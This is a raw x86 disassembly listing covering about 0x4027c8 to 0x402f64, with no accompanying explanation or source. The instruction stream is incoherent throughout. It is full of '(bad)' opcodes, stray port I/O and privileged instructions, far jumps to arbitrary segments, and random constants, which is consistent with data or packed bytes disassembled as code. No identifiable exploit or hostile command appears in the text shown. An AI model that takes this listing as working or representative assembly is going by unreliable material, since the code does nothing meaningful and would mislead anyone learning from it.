  4027c8:	mov    ch,0xf1
  4027ca:	push   ecx
  4027cb:	jnp    0x40277e
  4027cd:	or     ebx,DWORD PTR [ecx+0x69a9f7df]
  4027d3:	xor    edi,0x25
  4027d6:	and    al,0x2a
  4027d8:	jmp    0x402780
  4027da:	sub    ebx,edi
  4027dc:	push   esi
  4027dd:	adc    edx,DWORD PTR [eax+0x24]
  4027e0:	fmul   DWORD PTR [edx+0x28c12110]
  4027e6:	(bad)
  4027eb:	xor    DWORD PTR [ebp-0x59],0x62b951c9
  4027f2:	stos   DWORD PTR es:[edi],eax
  4027f3:	pop    es
  4027f4:	aad    0x3c
  4027f6:	ret    0x86b7
  4027f9:	iret   
  4027fa:	test   DWORD PTR [ecx],edx
  4027fc:	fadd   st,st(6)
  4027fe:	bound  eax,QWORD PTR [ecx+0x74]
  402801:	pop    ebx
  402802:	loop   0x402845
  402804:	xchg   esi,eax
  402805:	and    DWORD PTR [ebx],esp
  402807:	rol    ah,1
  402809:	mul    DWORD PTR [edx-0x1a]
  40280c:	sbb    DWORD PTR [eax+0x1c],esi
  40280f:	inc    esi
  402810:	xor    DWORD PTR [ebx-0x6a],eax
  402813:	clc    
  402814:	pop    es
  402815:	das    
  402816:	dec    esi
  402817:	icebp  
  402818:	mov    ds:0x63cfe271,eax
  40281d:	rol    al,0x76
  402820:	xlat   BYTE PTR ds:[ebx]
  402821:	pusha  
  402822:	cmc    
  402823:	adc    DWORD PTR [edx],edi
  402825:	call   0xda3f:0xab0f2a16
  40282c:	sub    eax,0xaa6bab4b
  402831:	inc    esp
  402832:	les    ebp,FWORD PTR [ecx+0x2ae1cf3e]
  402838:	push   esp
  402839:	das    
  40283a:	or     edi,0x4a18bcc3
  402840:	sbb    eax,0xeafefbc8
  402845:	push   ebx
  402846:	dec    ebx
  402847:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402848:	bound  ecx,QWORD PTR [edi+0x7c]
  40284b:	push   edi
  40284c:	mov    ebx,0x32a8ef26
  402851:	scas   eax,DWORD PTR es:[edi]
  402852:	xor    al,0x40
  402854:	pusha  
  402855:	lds    edx,FWORD PTR [ecx-0x7dd01141]
  40285b:	in     al,dx
  40285c:	in     al,0x9b
  40285e:	jb     0x4028a4
  402860:	inc    ebp
  402861:	pop    ss
  402862:	mov    ebp,eax
  402864:	mov    edx,DWORD PTR [ebx-0xd4d8f43]
  40286a:	cmp    cl,bh
  40286c:	nop
  40286d:	mov    ebx,0x7156e4af
  402872:	popf   
  402873:	xor    BYTE PTR [edx],ah
  402875:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402876:	xchg   BYTE PTR [ebp-0x5daae198],al
  40287c:	je     0x40283b
  40287e:	mov    bh,0x62
  402880:	jbe    0x4028d1
  402882:	jmp    0xd0e:0xd3cf7d9a
  402889:	cmp    eax,0xc90af7c0
  40288e:	loop   0x4028e7
  402890:	in     al,0xb5
  402892:	mov    esi,DWORD PTR [ebp-0x31b5690b]
  402898:	and    eax,0x3a685ca5
  40289d:	test   eax,ebp
  40289f:	ret    0xb21f
  4028a2:	scas   al,BYTE PTR es:[edi]
  4028a3:	(bad)  
  4028a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4028a5:	dec    ebx
  4028a6:	sbb    DWORD PTR [ecx+0x5],edx
  4028a9:	xor    BYTE PTR [edi-0x47],bl
  4028ac:	nop
  4028ad:	lods   al,BYTE PTR ds:[esi]
  4028ae:	mul    BYTE PTR [ebp-0x371c20b5]
  4028b4:	sahf   
  4028b5:	inc    esp
  4028b6:	cwde   
  4028b7:	sbb    al,0x24
  4028b9:	dec    esi
  4028ba:	inc    eax
  4028bb:	and    ebx,eax
  4028bd:	xlat   BYTE PTR ds:[ebx]
  4028be:	lods   al,BYTE PTR ds:[esi]
  4028bf:	(bad)  
  4028c0:	mov    cl,0xcc
  4028c2:	push   edx
  4028c3:	out    0x5c,eax
  4028c5:	inc    ecx
  4028c6:	cmp    BYTE PTR [edi],bh
  4028c8:	out    dx,eax
  4028c9:	jo     0x4028f0
  4028cb:	iret   
  4028cc:	retf   
  4028cd:	push   ebx
  4028ce:	inc    esi
  4028cf:	(bad)  
  4028d0:	hlt    
  4028d1:	stos   BYTE PTR es:[edi],al
  4028d2:	xor    eax,0x264e8535
  4028d7:	push   ss
  4028d8:	xor    BYTE PTR [ecx],al
  4028da:	dec    eax
  4028db:	inc    esi
  4028dc:	lahf   
  4028dd:	push   0xfffffff6
  4028df:	push   es
  4028e0:	dec    ebx
  4028e1:	pop    edi
  4028e2:	dec    ecx
  4028e3:	push   ecx
  4028e4:	test   al,0x4c
  4028e6:	hlt    
  4028e7:	loop   0x402937
  4028e9:	iret   
  4028ea:	mov    ecx,DWORD PTR [edi]
  4028ec:	xchg   DWORD PTR [edx],esi
  4028ee:	dec    esi
  4028ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4028f0:	xchg   esp,eax
  4028f1:	push   eax
  4028f2:	xchg   edx,eax
  4028f3:	imul   ebp,DWORD PTR [edi+0x1dd30ec0],0x500cb76e
  4028fd:	adc    eax,0x996b16e6
  402902:	outs   dx,BYTE PTR ds:[esi]
  402903:	(bad)  
  402905:	jne    0x4028ef
  402907:	sbb    esp,ebp
  402909:	sbb    al,0xbe
  40290b:	jmp    0x196fa822
  402910:	mov    eax,0x1dcfcec9
  402915:	or     eax,0xe78e16bd
  40291a:	add    esp,DWORD PTR [ecx+edx*8-0x68c5c5ac]
  402921:	push   esi
  402922:	xchg   esi,eax
  402923:	sbb    ebx,DWORD PTR [ebx-0x317bf0ed]
  402929:	iret   
  40292a:	xchg   ebx,eax
  40292b:	or     DWORD PTR [ebx],esp
  40292d:	aam    0xf2
  40292f:	loope  0x40295d
  402931:	mov    eax,ds:0x57dc13bd
  402936:	jp     0x4029ad
  402938:	pop    ds
  402939:	jb     0x4028d7
  40293b:	sahf   
  40293c:	xor    edi,DWORD PTR [edi+ecx*1]
  40293f:	or     DWORD PTR [ebx-0x3ef77967],ebp
  402945:	repnz pop ebx
  402947:	sti    
  402948:	loop   0x402939
  40294a:	xchg   esi,eax
  40294b:	int    0x40
  40294d:	iret   
  40294e:	fwait
  40294f:	mov    BYTE PTR [ecx],cl
  402951:	pop    ecx
  402952:	pop    esp
  402953:	sub    BYTE PTR [ecx],bl
  402955:	pop    es
  402956:	pop    esp
  402957:	xor    al,0x32
  402959:	icebp  
  40295a:	jns    0x40297a
  40295c:	and    al,0xaf
  40295e:	jge    0x402905
  402960:	sub    ah,BYTE PTR [ecx+0x76]
  402963:	mov    cl,0x23
  402965:	inc    edx
  402966:	sbb    eax,0x16d3d6cd
  40296b:	inc    edx
  40296c:	(bad)  
  40296d:	sahf   
  40296e:	idiv   BYTE PTR ds:0x467742eb
  402974:	cmp    ebx,edi
  402976:	mov    dh,0x8
  402978:	lods   al,BYTE PTR ds:[esi]
  402979:	push   ds
  40297a:	js     0x402943
  40297c:	jnp    0x40290f
  40297e:	test   DWORD PTR [ebp-0x80],0x1999aadf
  402985:	inc    eax
  402986:	jnp    0x40294e
  402988:	out    dx,al
  402989:	call   0x983c8433
  40298e:	or     al,0xc7
  402990:	cdq    
  402991:	mov    ch,0x4b
  402993:	jle    0x402928
  402995:	inc    eax
  402996:	jmp    0x5ffc:0x1f1255cd
  40299d:	add    eax,0xe27509ed
  4029a2:	cld    
  4029a3:	adc    eax,0x2a554a12
  4029a8:	xor    al,0x1e
  4029aa:	call   0x5dd256e7
  4029af:	add    DWORD PTR [ecx],edi
  4029b1:	inc    eax
  4029b2:	in     eax,dx
  4029b3:	dec    ebx
  4029b4:	out    0xcf,al
  4029b6:	push   edi
  4029b7:	jae    0x402a21
  4029b9:	inc    esi
  4029ba:	dec    ebp
  4029bb:	fmul   QWORD PTR [edx+0x62f48f96]
  4029c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4029c2:	push   0xfffffff2
  4029c4:	fcom   DWORD PTR [edi-0x2a3dc9ee]
  4029ca:	stos   DWORD PTR es:[edi],eax
  4029cb:	sub    DWORD PTR [ebx],ecx
  4029cd:	jo     0x402996
  4029cf:	sub    al,0xce
  4029d1:	cmp    esi,eax
  4029d3:	adc    DWORD PTR [ebx+0x6],0x45
  4029d7:	call   0x5d0c:0xd5183b2d
  4029de:	add    eax,0x7632de4
  4029e3:	mov    eax,0xf457e231
  4029e8:	push   0x15
  4029ea:	xchg   edi,eax
  4029eb:	fist   WORD PTR [eax]
  4029ed:	ins    BYTE PTR es:[edi],dx
  4029ee:	cmp    al,0x54
  4029f0:	cmp    ebp,ebx
  4029f2:	or     al,0xba
  4029f4:	lea    edi,[ecx]
  4029f6:	(bad)  
  4029f7:	sbb    BYTE PTR [ebp+0x5fda576f],dl
  4029fd:	jb     0x4029d8
  4029ff:	add    ebp,esi
  402a01:	leave  
  402a02:	push   ds
  402a03:	dec    eax
  402a04:	mov    eax,0xd28eeb77
  402a09:	mov    esp,0x2edeb234
  402a0e:	push   0xc10f8a3f
  402a13:	fdivr  QWORD PTR [ebx+0x5f49db67]
  402a19:	mov    eax,ds:0x787908fb
  402a1e:	ja     0x4029a1
  402a20:	add    BYTE PTR [eax-0x45],0x5d
  402a24:	dec    edx
  402a25:	or     dl,bl
  402a27:	imul   ecx,DWORD PTR [ebx+0x3f7557f7],0x738cff51
  402a31:	inc    edx
  402a32:	jmp    0xa45:0x4e311c7b
  402a39:	xchg   esi,eax
  402a3a:	pop    eax
  402a3b:	into   
  402a3c:	call   0xe623bd17
  402a41:	test   DWORD PTR [edx-0x51],ebp
  402a44:	mov    eax,ds:0x9717a7c8
  402a49:	outs   dx,BYTE PTR ds:[esi]
  402a4a:	inc    esp
  402a4b:	cs loope 0x402a6f
  402a4e:	mov    bl,0x5e
  402a50:	pusha  
  402a51:	xor    eax,0xfce54454
  402a56:	(bad)  
  402a57:	cmovbe edi,ebx
  402a5a:	ficomp DWORD PTR [edx]
  402a5c:	sti    
  402a5d:	or     al,0xce
  402a5f:	xchg   edx,eax
  402a60:	retf   0x156e
  402a63:	ins    DWORD PTR es:[edi],dx
  402a64:	xchg   esi,eax
  402a65:	pop    edi
  402a66:	cmp    DWORD PTR [eax],edx
  402a68:	sti    
  402a69:	mov    ah,0x3d
  402a6b:	sti    
  402a6c:	fisubr DWORD PTR [ebx]
  402a6e:	push   edi
  402a6f:	push   0x8a768149
  402a74:	rol    bl,1
  402a76:	push   ebx
  402a77:	mov    bh,0x4b
  402a79:	and    ebp,eax
  402a7b:	jne    0x402a84
  402a7d:	mov    BYTE PTR [esi-0x65],ch
  402a80:	data16 jnp 0x402a64
  402a83:	leave  
  402a84:	push   es
  402a85:	jbe    0x402a5f
  402a87:	mov    cl,0xdb
  402a89:	jnp    0x402a40
  402a8b:	cdq    
  402a8c:	mov    ebp,0x61054741
  402a91:	jb     0x402a21
  402a93:	add    al,0xdc
  402a95:	fild   WORD PTR [eax]
  402a97:	jl     0x402aee
  402a99:	aas    
  402a9a:	adc    edx,0x2d
  402a9d:	jmp    0xf3550cbf
  402aa2:	dec    ecx
  402aa3:	int3   
  402aa4:	inc    ebp
  402aa5:	rcl    eax,cl
  402aa7:	mov    ds:0x5d62e37b,al
  402aac:	push   eax
  402aad:	mov    al,ds:0x655bd18a
  402ab2:	dec    eax
  402ab3:	cld    
  402ab4:	mov    WORD PTR gs:[ebp+0x17041cdf],cs
  402abb:	data16 jmp 0x402a50
  402abe:	daa    
  402abf:	in     eax,0xb0
  402ac1:	xchg   ecx,eax
  402ac2:	pop    ecx
  402ac3:	jnp    0x402a98
  402ac5:	enter  0x3e36,0xfd
  402ac9:	jp     0x402a86
  402acb:	or     al,dh
  402acd:	in     eax,dx
  402ace:	sbb    BYTE PTR [ebx-0x4141c374],cl
  402ad4:	sbb    BYTE PTR [edx+0x194811a9],0xb1
  402adb:	push   edx
  402adc:	pusha  
  402add:	sub    DWORD PTR [ebp-0x6d],esp
  402ae0:	clc    
  402ae1:	clc    
  402ae2:	push   ecx
  402ae3:	rol    ah,1
  402ae5:	mov    cl,0xc2
  402ae7:	(bad)  
  402ae8:	icebp  
  402ae9:	inc    edi
  402aea:	fmul   st(5),st
  402aec:	jbe    0x402ab9
  402aee:	inc    edi
  402aef:	stos   DWORD PTR es:[edi],eax
  402af0:	mov    dh,0xe7
  402af2:	out    dx,eax
  402af3:	inc    ecx
  402af4:	fwait
  402af5:	cdq    
  402af6:	sti    
  402af7:	cmp    ch,BYTE PTR [eax+edi*4]
  402afa:	loopne 0x402b66
  402afc:	or     al,0xd5
  402afe:	mov    esp,0x77f7cad7
  402b03:	adc    eax,DWORD PTR [edi]
  402b05:	ror    ebp,1
  402b07:	sub    DWORD PTR [esp+edi*1-0x3796333e],ebp
  402b0e:	fcomp  QWORD PTR [ecx+0x76]
  402b11:	fwait
  402b12:	and    bl,BYTE PTR [eax]
  402b14:	sahf   
  402b15:	inc    esi
  402b16:	and    eax,0x51cb0869
  402b1b:	mov    eax,0x18084dcc
  402b20:	xchg   ebp,eax
  402b21:	(bad)  
  402b22:	jg     0x402aec
  402b24:	fwait
  402b25:	jp     0x402b49
  402b27:	adc    bl,BYTE PTR [edx]
  402b29:	nop
  402b2a:	jge    0x402ad1
  402b2c:	mov    ah,0xe7
  402b2e:	add    BYTE PTR [ebx-0x37a9c448],bh
  402b34:	mov    dl,BYTE PTR [esi-0x4b]
  402b37:	gs ss pop eax
  402b3a:	sub    dl,BYTE PTR [esi+esi*4+0xf03dfe2]
  402b41:	xchg   esi,eax
  402b42:	shl    DWORD PTR [eax-0x46509344],0x89
  402b49:	js     0x402b4c
  402b4b:	les    esp,FWORD PTR [ecx+0x4e]
  402b4e:	iret   
  402b4f:	or     ebp,DWORD PTR [edx]
  402b51:	dec    ebx
  402b52:	cs loopne 0x402af6
  402b55:	sahf   
  402b56:	ret    0x257
  402b59:	shl    BYTE PTR [esi+0x44],cl
  402b5c:	out    0x71,eax
  402b5e:	sbb    edx,edx
  402b60:	mov    ecx,0x1e02b616
  402b65:	cmp    ch,BYTE PTR [edi+esi*2-0x2ddf2c7b]
  402b6c:	and    ebx,DWORD PTR [eax+edx*1]
  402b6f:	sahf   
  402b70:	push   ebx
  402b71:	push   esi
  402b72:	int3   
  402b73:	mov    cl,0x77
  402b75:	jo     0x402b58
  402b77:	jno    0x402bea
  402b79:	xor    BYTE PTR [edx-0x46],dh
  402b7c:	jg     0x402b11
  402b7e:	scas   al,BYTE PTR es:[edi]
  402b7f:	shr    DWORD PTR [ebx+0x0],0x6a
  402b83:	mov    ebp,0xe3022097
  402b88:	scas   al,BYTE PTR es:[edi]
  402b89:	mov    edx,0xaaf2983a
  402b8e:	sub    DWORD PTR [esi-0x56],edx
  402b91:	mov    eax,ds:0xcaaab94d
  402b96:	push   es
  402b97:	ins    BYTE PTR es:[edi],dx
  402b98:	cmp    DWORD PTR [eax+esi*1+0x533252f2],0x75a1f905
  402ba3:	rcr    esp,cl
  402ba5:	sbb    esp,DWORD PTR [ecx+0xb]
  402ba8:	iret   
  402ba9:	mov    ch,0x18
  402bab:	inc    edi
  402bac:	mov    ebp,0xac4fda84
  402bb1:	pop    es
  402bb2:	adc    al,0x9f
  402bb4:	call   0xa4d0bb68
  402bb9:	xor    DWORD PTR [edi],edx
  402bbb:	xchg   edi,eax
  402bbc:	and    edx,ebx
  402bbe:	inc    edx
  402bbf:	inc    esi
  402bc0:	cmc    
  402bc1:	jmp    0xdf9cfe67
  402bc6:	test   DWORD PTR [eax+0x4be2a79c],0x3fb65296
  402bd0:	or     al,0x6
  402bd2:	mov    dh,0xa1
  402bd4:	mov    esi,0x28fdc5a5
  402bd9:	inc    ecx
  402bda:	arpl   dx,ax
  402bdc:	stos   DWORD PTR es:[edi],eax
  402bdd:	adc    DWORD PTR [ebx-0x15],eax
  402be0:	push   0x27
  402be2:	mov    DWORD PTR [edi-0x48449c9b],esp
  402be8:	sbb    edi,esp
  402bea:	fidivr DWORD PTR [ecx]
  402bec:	jno    0x402c0e
  402bee:	loop   0x402c19
  402bf0:	das    
  402bf1:	lods   eax,DWORD PTR ds:[esi]
  402bf2:	aaa    
  402bf3:	lods   eax,DWORD PTR ds:[esi]
  402bf4:	loop   0x402c1a
  402bf6:	popw   ss
  402bf8:	sub    eax,0xf3995253
  402bfd:	aas    
  402bfe:	sbb    al,0x64
  402c00:	imul   DWORD PTR [ecx+0x59]
  402c03:	dec    edi
  402c04:	sahf   
  402c05:	stos   DWORD PTR es:[edi],eax
  402c06:	sub    edx,DWORD PTR [esi-0x772a2cee]
  402c0c:	loop   0x402ba4
  402c0e:	lods   al,BYTE PTR ds:[esi]
  402c0f:	push   es
  402c10:	mov    cl,0x9
  402c12:	push   edi
  402c13:	lahf   
  402c14:	xor    al,0x2f
  402c16:	or     eax,DWORD PTR [esi-0x3e]
  402c19:	clc    
  402c1a:	ins    DWORD PTR es:[edi],dx
  402c1b:	stos   DWORD PTR es:[edi],eax
  402c1c:	stc    
  402c1d:	gs sbb eax,0xd3053520
  402c23:	loope  0x402bc4
  402c25:	retf   
  402c26:	sti    
  402c27:	sbb    ebp,DWORD PTR ds:0x399a1d8b
  402c2d:	jnp    0x402c83
  402c2f:	mov    es,WORD PTR [ebx-0x4b]
  402c32:	call   0x6b62:0xd5ed2d12
  402c39:	call   0xae938ad9
  402c3e:	sbb    BYTE PTR [ebx],0x1d
  402c41:	shl    BYTE PTR [ebp-0x4854b28d],cl
  402c47:	mov    ebx,0x6d05ddec
  402c4c:	add    al,0xd7
  402c4e:	xchg   ebp,eax
  402c4f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402c50:	aaa    
  402c51:	add    ecx,eax
  402c53:	inc    ebx
  402c54:	mov    eax,0x59b27167
  402c59:	cmp    esi,eax
  402c5b:	(bad)  
  402c5d:	xchg   ecx,eax
  402c5e:	sub    ah,ah
  402c60:	addr16 in eax,dx
  402c62:	test   ch,ch
  402c64:	xchg   edi,eax
  402c65:	mov    cl,0xd
  402c67:	shl    DWORD PTR [eax],cl
  402c69:	stc    
  402c6a:	xor    BYTE PTR [ebp+0x7ebadd41],al
  402c70:	ins    BYTE PTR es:[edi],dx
  402c71:	jne    0x402c44
  402c73:	call   0x98c3:0x4c455fa4
  402c7a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402c7b:	and    al,0x5e
  402c7d:	push   0x3e
  402c7f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402c80:	cs dec ebx
  402c82:	repnz mov eax,ds:0xf56f2956
  402c88:	(bad)  
  402c89:	in     al,0x4a
  402c8b:	push   ds
  402c8c:	jmp    0x569a:0x358ccdd9
  402c93:	lock ret 
  402c95:	test   DWORD PTR [eax],eax
  402c97:	add    DWORD PTR [edx+ecx*8],0xffffff9c
  402c9b:	(bad)  
  402c9e:	test   BYTE PTR [ebp+0x6e8b0d05],bh
  402ca4:	mov    bh,0x2
  402ca6:	loope  0x402c46
  402ca8:	xor    al,0x8c
  402caa:	lods   al,BYTE PTR ds:[esi]
  402cab:	retf   
  402cac:	mov    ecx,0xac1c3efe
  402cb1:	push   esi
  402cb2:	xchg   esi,eax
  402cb3:	mov    BYTE PTR [eax+eax*8-0x23b4be70],bl
  402cba:	mov    DWORD PTR [edi],ebx
  402cbc:	fcom   DWORD PTR [ebx+edx*4-0x3fd3b904]
  402cc3:	rol    ebp,0xe9
  402cc6:	sbb    DWORD PTR [edx+0x1d8e7c83],ebp
  402ccc:	mov    ax,ds:0x221c15a0
  402cd2:	jecxz  0x402c92
  402cd4:	mov    bl,0x5e
  402cd6:	or     DWORD PTR [ebp-0x43],ebp
  402cd9:	fdivr  st,st(7)
  402cdb:	ja     0x402cdb
  402cdd:	mov    gs,WORD PTR [eax-0x45]
  402ce0:	mov    ch,al
  402ce2:	lods   al,BYTE PTR ds:[esi]
  402ce3:	push   0x71f1d601
  402ce8:	repz mov bl,0x45
  402ceb:	jns    0x402d0f
  402ced:	xchg   BYTE PTR [edx+0x2a],bl
  402cf0:	fld    TBYTE PTR [ebp+0x23]
  402cf3:	test   DWORD PTR [ecx-0xc],edi
  402cf6:	pop    esp
  402cf7:	adc    eax,0xcb35f818
  402cfc:	sbb    ecx,DWORD PTR ss:[edx-0x6]
  402d00:	inc    edi
  402d01:	pop    edx
  402d02:	pop    ss
  402d03:	or     edx,edi
  402d05:	das    
  402d06:	inc    edi
  402d07:	nop
  402d08:	add    edi,ebp
  402d0a:	mov    ch,0xdf
  402d0c:	pop    ss
  402d0d:	aas    
  402d0e:	rcl    DWORD PTR [ebx+0x7a],0xb6
  402d12:	mov    ds:0xd94375ea,al
  402d17:	cmp    eax,0xec8e832b
  402d1c:	sbb    al,0x73
  402d1e:	mov    eax,ds:0xfde7cf33
  402d23:	adc    esp,eax
  402d25:	lds    edi,FWORD PTR [ebx]
  402d27:	loope  0x402d0d
  402d29:	test   BYTE PTR [esi+0x2e],dl
  402d2c:	cmp    eax,0x1ad6da0a
  402d31:	ret    0x7713
  402d34:	adc    al,0x9
  402d36:	push   esp
  402d37:	enter  0xe8e5,0xc6
  402d3b:	outs   dx,DWORD PTR ds:[esi]
  402d3c:	arpl   WORD PTR [edx],sp
  402d3e:	clc    
  402d3f:	jmp    0x76ea8e97
  402d44:	loop   0x402dbc
  402d46:	jmp    DWORD PTR [eax+ecx*2+0x3d]
  402d4a:	scas   eax,DWORD PTR es:[edi]
  402d4b:	xlat   BYTE PTR ds:[ebx]
  402d4c:	std    
  402d4d:	mov    dl,0x95
  402d4f:	sbb    ecx,eax
  402d51:	pop    ebp
  402d52:	sub    al,0x4a
  402d54:	cmp    al,0x3c
  402d56:	mov    esi,0xac159ea8
  402d5b:	test   al,0xb8
  402d5d:	test   BYTE PTR [edi],0x81
  402d60:	cmc    
  402d61:	repz arpl WORD PTR [ebx],bp
  402d64:	ret    
  402d65:	adc    BYTE PTR [ebx+0x7b],dh
  402d68:	jmp    0x1b10a7d2
  402d6d:	pop    esp
  402d6e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402d6f:	mov    ch,0xce
  402d71:	xor    DWORD PTR [ebp-0x482e443f],0x6ca45979
  402d7b:	adc    DWORD PTR [ebx+0x64],esp
  402d7e:	add    BYTE PTR [ebx],dh
  402d80:	mov    bh,0x5c
  402d82:	jnp    0x402df7
  402d84:	sbb    al,0x26
  402d86:	add    BYTE PTR [edi-0x6efdfc76],al
  402d8c:	cmc    
  402d8d:	cmp    eax,0x219bb234
  402d92:	popf   
  402d93:	push   esi
  402d94:	mov    eax,ds:0xf503076b
  402d99:	scas   eax,DWORD PTR es:[edi]
  402d9a:	in     eax,dx
  402d9b:	repnz shr BYTE PTR [esi],cl
  402d9e:	or     al,bl
  402da0:	imul   edi,DWORD PTR [edx-0x7bc6204b],0x3f
  402da7:	retf   
  402da8:	cld    
  402da9:	cmp    al,0x57
  402dab:	cmp    eax,0x5798f84b
  402db0:	or     BYTE PTR [eax],cl
  402db2:	push   ebp
  402db3:	sub    esi,edx
  402db5:	jmp    0x2611e75a
  402dba:	leave  
  402dbb:	fwait
  402dbc:	mov    edx,ds
  402dbe:	pop    ds
  402dbf:	lahf   
  402dc0:	jnp    0x402e41
  402dc2:	cmc    
  402dc3:	mov    edi,0xf6766e5e
  402dc8:	xor    al,0xcc
  402dca:	sub    DWORD PTR ds:0x26c9859f,edx
  402dd0:	mov    ecx,0xb4cbf4a1
  402dd5:	stos   DWORD PTR es:[edi],eax
  402dd6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402dd7:	rol    DWORD PTR [esi],cl
  402dd9:	xchg   esp,eax
  402dda:	call   0xdfca:0xbf047b69
  402de1:	jmp    0x402e5f
  402de3:	jae    0x402ddc
  402de5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402de6:	or     cl,BYTE PTR [ebx+ebp*8-0xd]
  402dea:	(bad)  
  402dec:	pop    edx
  402ded:	mov    esp,0xb42a6b78
  402df2:	gs cs pushf 
  402df5:	mov    bh,0xa5
  402df7:	mov    ds:0x1f46dc7b,eax
  402dfc:	jle    0x402dcc
  402dfe:	push   cs
  402dff:	mov    ecx,0xa7e1b35d
  402e04:	fincstp 
  402e06:	int3   
  402e07:	push   es
  402e08:	jecxz  0x402da2
  402e0a:	cmp    dl,0x1f
  402e0d:	lea    ecx,[eax-0x74c8932a]
  402e13:	mov    eax,ds:0xce6e8af1
  402e18:	ret    0xa101
  402e1b:	mov    ch,0x80
  402e1d:	cmp    cl,BYTE PTR [eax+0x13]
  402e20:	adc    eax,0x6904e417
  402e25:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402e26:	pop    esi
  402e27:	dec    esp
  402e28:	xchg   edx,eax
  402e29:	dec    esi
  402e2a:	sbb    al,0xbd
  402e2c:	cdq    
  402e2d:	sbb    al,0x8d
  402e2f:	xchg   edx,eax
  402e30:	pop    ebx
  402e31:	addr16 pushf 
  402e33:	leave  
  402e34:	pusha  
  402e35:	pushf  
  402e36:	jle    0x402df2
  402e38:	jne    0x402e79
  402e3a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402e3b:	mov    dl,0x9d
  402e3d:	add    bh,BYTE PTR [ebx]
  402e3f:	add    cl,BYTE PTR [edx+0x12]
  402e42:	ror    BYTE PTR [edi+ebp*8-0x41],cl
  402e46:	mov    ch,0xe7
  402e48:	jmp    0xc593:0xfbdb8188
  402e4f:	jmp    0x402df0
  402e51:	jmp    0x67de9405
  402e56:	push   0xffffff83
  402e58:	cmp    BYTE PTR [eax],al
  402e5a:	test   BYTE PTR [edi-0x7b],bl
  402e5d:	sbb    DWORD PTR [edi+0x21665d69],eax
  402e63:	pop    ss
  402e64:	ret    
  402e65:	inc    ecx
  402e66:	call   0x246f15fb
  402e6b:	aaa    
  402e6c:	fs sahf 
  402e6e:	pop    ss
  402e6f:	cmc    
  402e70:	out    dx,eax
  402e71:	addr16 sub eax,esp
  402e74:	xchg   esi,eax
  402e75:	test   al,0xae
  402e77:	sub    eax,0x63f52a1d
  402e7c:	ret    0x7bd5
  402e7f:	fimul  DWORD PTR es:[ecx-0x527abe13]
  402e86:	and    ah,BYTE PTR [edi]
  402e88:	nop
  402e89:	retf   
  402e8a:	or     DWORD PTR [esi+0x612612ae],0xffffffaf
  402e91:	pop    es
  402e92:	bound  ebp,QWORD PTR [ebp+eax*8+0x7cba1cfd]
  402e99:	repz and al,0x94
  402e9c:	clc    
  402e9d:	(bad)  
  402e9e:	mov    bh,0x47
  402ea0:	aam    0x3f
  402ea2:	jmp    0xece7:0xdbc7190b
  402ea9:	xchg   bh,cl
  402eab:	jle    0x402ee0
  402ead:	repz hlt 
  402eaf:	clc    
  402eb0:	stos   DWORD PTR es:[edi],eax
  402eb1:	fsub   DWORD PTR [eax]
  402eb3:	cmp    al,0xc8
  402eb5:	mov    ah,0xe0
  402eb7:	rcr    DWORD PTR [edx+0x19],0xb6
  402ebb:	mov    dh,0x51
  402ebd:	(bad)  
  402ebe:	outs   dx,DWORD PTR ds:[esi]
  402ebf:	pop    esi
  402ec0:	sub    al,0x4f
  402ec2:	xor    DWORD PTR [ebx+0x5d],ebx
  402ec5:	sub    BYTE PTR [edi],bl
  402ec7:	(bad)  
  402ec8:	xchg   esp,eax
  402ec9:	adc    al,0x37
  402ecb:	sar    DWORD PTR [ebp+0x5e],cl
  402ece:	cmc    
  402ecf:	xchg   edi,eax
  402ed0:	fidiv  WORD PTR [edi+eiz*4-0x5dd2469]
  402ed7:	inc    ebp
  402ed8:	rcl    DWORD PTR [ecx+0x7a587c11],1
  402ede:	mov    ecx,0x9eb7dae2
  402ee3:	dec    ebx
  402ee4:	mov    edi,0xbf1ceaa4
  402ee9:	pop    ds
  402eea:	std    
  402eeb:	shl    DWORD PTR [edi-0x6e],1
  402eee:	cmp    BYTE PTR [ecx+0x427e66c4],al
  402ef4:	clc    
  402ef5:	pop    ds
  402ef6:	pop    eax
  402ef7:	mov    edi,0xc5195584
  402efc:	pop    ecx
  402efd:	test   DWORD PTR [eax+0x65],ebx
  402f00:	rcr    BYTE PTR [edi-0x50],cl
  402f03:	ins    DWORD PTR es:[edi],dx
  402f04:	mov    DWORD PTR [esi-0x72],edi
  402f07:	lahf   
  402f08:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402f09:	pop    edx
  402f0a:	loop   0x402f23
  402f0c:	mov    ds:0x4ec75bce,al
  402f11:	pop    ecx
  402f12:	adc    eax,0xd2245584
  402f17:	and    BYTE PTR [ebp-0x13028e1f],dl
  402f1d:	jmp    0x2cd8:0x30c57648
  402f24:	mov    ebp,DWORD PTR [edi+0x15]
  402f27:	sbb    bh,BYTE PTR [ecx+0x44]
  402f2a:	sbb    eax,0x76f53952
  402f2f:	dec    edi
  402f30:	or     BYTE PTR [ecx-0x2251c95f],cl
  402f36:	sub    al,0x5
  402f38:	sar    BYTE PTR [ecx+0x3d],0x82
  402f3c:	std    
  402f3d:	rol    DWORD PTR [ebx],cl
  402f3f:	(bad)  [edx]
  402f41:	out    dx,eax
  402f42:	pusha  
  402f43:	or     esp,edi
  402f45:	inc    esi
  402f46:	pushf  
  402f47:	inc    edi
  402f48:	inc    eax
  402f49:	push   ebp
  402f4a:	push   esp
  402f4b:	sbb    dh,BYTE PTR [edx+edi*1]
  402f4e:	test   BYTE PTR [esi-0xd23959b],ah
  402f54:	popf   
  402f55:	jne    0x402f7c
  402f57:	sbb    eax,DWORD PTR [esp+edi*1-0xc]
  402f5b:	fsub   QWORD PTR [edi-0x28a3f7b8]
  402f61:	jns    0x402fab
  402f63:	ins    BYTE PTR es:[edi],dx
  402f64:	cmp    dl,dl
